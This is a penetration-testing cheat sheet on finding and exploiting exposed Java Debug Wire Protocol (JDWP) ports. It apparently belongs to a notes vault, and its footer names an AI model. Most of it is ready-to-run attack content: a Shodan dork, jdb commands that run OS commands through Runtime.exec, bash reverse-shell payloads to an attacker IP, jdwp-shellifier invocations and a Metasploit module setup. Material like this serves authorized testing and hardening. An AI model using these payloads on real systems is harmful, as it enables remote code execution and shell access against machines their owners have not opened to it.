# JDWP

#JDWP #JavaDebugWireProtocol #Java #RCE #webservices

## What is JDWP?
Java Debug Wire Protocol — protocol used by Java debuggers to communicate with a running JVM. When a JVM is started with `-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=<port>`, it listens for debugger connections. Requires no authentication by default. Any connected debugger has full control over the JVM — arbitrary code execution.

- Port: **TCP 8000** (common default), **TCP 5005**, **TCP 5050** — varies by config
- Authentication: **none by default** (any host can connect)
- Java startup flag: `-agentlib:jdwp=...` or `-Xdebug -Xrunjdwp:...`

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Scanning/NMAP\|nmap]] | Detect the port / `JDWP-Handshake` banner |
| [[Tools/Remote Access/Netcat\|Netcat]] | Manual handshake probe (`echo JDWP-Handshake \| nc`) |
| [[Tools/Web/jdb\|jdb]] | JDK debugger — attach and drive the JVM to RCE by hand |
| [[Tools/Web/jdwp-shellifier\|jdwp-shellifier]] | Automated JDWP→RCE (breakpoint-on-method → `Runtime.exec`) |
| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `exploit/multi/misc/java_jdwp_debugger` |

---

## Enumeration

```bash
# Nmap
nmap -p 8000,5005,5050 --script banner -sV <target>
nmap -p 8000 -sV <target>   # JDWP identified by banner "JDWP-Handshake"

# Manual check — send JDWP handshake
echo "JDWP-Handshake" | nc -w 2 <target> 8000

# Shodan dork (recon): port:8000 "JDWP-Handshake"
```

---

## Connect / Access

```bash
# jdb (Java Debugger — built into JDK)
jdb -connect com.sun.jdi.SocketAttach:hostname=<target>,port=8000

# If remote — via SSH tunnel
ssh -L 8000:127.0.0.1:8000 <user>@<target> -N
jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8000

# jdb commands once connected:
# (jdb) version                   -- JVM version
# (jdb) classes                   -- list loaded classes
# (jdb) methods java.lang.Runtime -- list Runtime methods
# (jdb) run                       -- resume execution
```

---

## Attack Vectors

### RCE via Runtime.exec (jdb)

```bash
# Connect to JDWP
jdb -connect com.sun.jdi.SocketAttach:hostname=<target>,port=8000

# Once connected — execute OS command
# (jdb) 
print new java.lang.String(java.lang.Runtime.getRuntime().exec(new String[]{"id"}).getInputStream().readAllBytes())

# Reverse shell
print new java.lang.String(java.lang.Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1"}).getInputStream().readAllBytes())

# Windows
print new java.lang.String(java.lang.Runtime.getRuntime().exec(new String[]{"cmd.exe","/c","whoami"}).getInputStream().readAllBytes())
```

> [!warning] **`readAllBytes()` is Java 9+.** On Java 8 / older JVMs it doesn't exist — either drop the read and rely on a side effect (write a file, spawn a reverse shell) or read the stream the long way:
> ```
> print new java.util.Scanner(java.lang.Runtime.getRuntime().exec(new String[]{"id"}).getInputStream()).useDelimiter("\\A").next()
> ```
> The `exec()` itself works on every JVM version — output echo is the only version-sensitive part, so a blind reverse shell is the most portable payload.

### Automated Exploitation (jdwp-shellifier)

The tool sets a breakpoint on a chosen Java method, then when any thread hits it (giving a live thread context) invokes `Runtime.exec`. Only `SUSPEND_EVENTTHREAD` is used, so the app keeps running.

```bash
# Original (IOActive/hugsy) is Python2; use a Python3 fork on a modern box:
#   https://github.com/s0ld13rr/jdwp-knife   (py3 rewrite, interactive shell)
#   https://github.com/IOActive/jdwp-shellifier  (PR #8 ports to py3)

# Default breakpoint is java.net.ServerSocket.accept — only fires on a NEW connection,
# so it can hang forever on an idle service. Prefer a HOT method that runs constantly:
python3 jdwp-shellifier.py -t <target> -p 8000 \
  --break-on "java.lang.String.indexOf" --cmd "id"

# Reverse shell (blind — no output needed, works on any JVM version)
python3 jdwp-shellifier.py -t <target> -p 8000 \
  --break-on "java.lang.String.indexOf" \
  --cmd "bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'"
```

> [!tip] **Breakpoint choice = reliability.** `ServerSocket.accept` needs you to trigger a fresh connection; `String.indexOf`/`String.equals` fire on nearly every request, so the payload lands immediately. If one method never trips, pick another high-traffic one from `classes`/`methods` output.

### Metasploit

```bash
use exploit/multi/misc/java_jdwp_debugger
set RHOSTS <target>
set RPORT 8000
set LHOST <attacker_ip>
run
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| JDWP listening on `0.0.0.0` | RCE from any host |
| No authentication | Any debugger gets full JVM control |
| Production server with debug enabled | Code execution as app user (often root/service account) |
| Default port exposed | Easy discovery |

---

## Quick Reference

| Goal | Command |
|---|---|
| Detect | `echo "JDWP-Handshake" \| nc -w 2 host 8000` |
| Nmap | `nmap -p 8000 -sV host` |
| Connect (jdb) | `jdb -connect com.sun.jdi.SocketAttach:hostname=host,port=8000` |
| RCE (jdb) | `print new java.lang.String(Runtime.getRuntime().exec("id").getInputStream().readAllBytes())` |
| Automated | `python3 jdwp-shellifier.py -t host -p 8000 --break-on java.lang.String.indexOf --cmd "id"` |
| MSF | `exploit/multi/misc/java_jdwp_debugger` |

---

*Created: 2026-07-13*
*Updated: 2026-09-24*
*Model: claude-opus-4-8*
